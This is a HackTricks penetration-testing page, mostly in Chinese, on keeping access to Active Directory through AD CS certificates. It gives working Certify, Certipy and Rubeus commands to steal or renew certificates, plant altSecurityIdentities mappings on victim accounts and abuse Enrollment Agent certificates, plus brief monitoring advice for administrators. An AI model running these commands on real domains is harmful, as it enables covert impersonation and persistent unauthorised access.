# AD CS 账户持久化

{{#include ../../../banners/hacktricks-training.md}}

**这是对来自 [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) 的精彩研究中有关账户持久化章节的小总结**

## 使用证书理解活动用户凭证窃取 – PERSIST1

在一种情形中，用户可以请求允许域身份验证的证书，攻击者便有机会请求并窃取该证书以在网络上维持持久性。默认情况下，Active Directory 中的 `User` 模板允许此类请求，尽管有时可能被禁用。

使用 [Certify](https://github.com/GhostPack/Certify) 或 [Certipy](https://github.com/ly4k/Certipy)，你可以搜索允许客户端认证并已启用的模板，然后请求其中一个：
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
证书的力量在于它能够以其所属用户的身份进行身份验证，只要证书仍然有效，即便密码已更改也不受影响。

你可以将 PEM 转换为 PFX 并使用它来获取 TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> 注意：结合其他技术（见 THEFT 部分），certificate-based auth 允许在不触及 LSASS 的情况下实现持久访问，甚至可以从 non-elevated contexts 获取访问。

## 使用证书获得机器持久性 - PERSIST2

如果攻击者在主机上拥有提升的权限，他们可以使用默认的 `Machine` 模板为受感染系统的机器帐户注册证书。以机器身份进行身份验证可以为本地服务启用 S4U2Self，并能提供持久的主机持久性：
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 通过证书续期扩展持久性 - PERSIST3

滥用证书模板的有效期和续期期限可以让攻击者维持长期访问。如果你拥有先前颁发的证书及其私钥，你可以在证书到期前对其进行续期，以获取新的长期有效凭证，而不会留下与原始主体相关的额外请求痕迹。
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> 操作提示：跟踪攻击者持有的 PFX 文件的有效期并提前续订。续订还可能导致更新后的证书包含现代 SID 映射扩展，从而在更严格的 DC 映射规则下仍可使用（参见下一节）。

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

如果你能写入目标账户的 `altSecurityIdentities` 属性，就可以将攻击者控制的证书显式映射到该账户。该映射会在密码更改后仍然存在，并且在使用强映射格式时，在现代 DC 的强制执行下仍然可用。

高层流程：

1. 获取或签发一个由你控制的客户端认证证书（例如，以你自己的身份注册 `User` 模板）。
2. 从证书中提取一个强标识符（Issuer+Serial、SKI 或 SHA1-PublicKey）。
3. 使用该标识符在受害者主体的 `altSecurityIdentities` 上添加显式映射。
4. 使用你的证书进行身份验证；DC 会通过该显式映射将其映射到受害者。

示例（PowerShell）使用强 Issuer+Serial 映射：
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
然后使用你的 PFX 进行身份验证。Certipy 将直接获取 TGT：
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### 构建强健的 `altSecurityIdentities` 映射

在实践中，**Issuer+Serial** 和 **SKI** 映射是从攻击者持有的证书构建最容易的强格式。这在 **February 11, 2025** 之后尤其重要，届时 DCs 默认采用 **Full Enforcement**，弱映射将不再可靠。
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- 使用仅强映射类型：`X509IssuerSerialNumber`、`X509SKI` 或 `X509SHA1PublicKey`。弱格式（Subject/Issuer、Subject-only、RFC822 email）已弃用，且可被 DC 策略阻止。
- 映射同时适用于 **user** 和 **computer** 对象，因此对计算机帐户的 `altSecurityIdentities` 具有写访问即可以该机器身份持久化。
- 证书链必须可构建到由 DC 信任的根。NTAuth 中的 Enterprise CAs 通常受信；某些环境也信任公有 CA。
- 即使因为 DC 缺少 Smart Card Logon EKU 或返回 `KDC_ERR_PADATA_TYPE_NOSUPP` 导致 PKINIT 失败，Schannel 身份验证在持久化方面仍然有用。

For more on weak explicit mappings and attack paths, see:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
必须撤销代理证书或模板权限才能清除此持久化。

操作说明
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.
- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since February 11, 2025, DCs default to Full Enforcement, rejecting weak/ambiguous mappings. Practical implications:

- Pre-2022 certificates that lack the SID mapping extension may fail implicit mapping when DCs are in Full Enforcement. Attackers can maintain access by either renewing certificates through AD CS (to obtain the SID extension) or by planting a strong explicit mapping in `altSecurityIdentities` (PERSIST4).
- Explicit mappings using strong formats (Issuer+Serial, SKI, SHA1-PublicKey) continue to work. Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked and should be avoided for persistence.

Administrators should monitor and alert on:
- Changes to `altSecurityIdentities` and issuance/renewals of Enrollment Agent and User certificates.
- CA issuance logs for on-behalf-of requests and unusual renewal patterns.

## References

- Microsoft. KB5014754：Windows 域控制器上的基于证书的身份验证更改（enforcement timeline and strong mappings）。
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – 命令参考 (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. 当不支持 PKINIT 时使用证书进行身份验证。
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
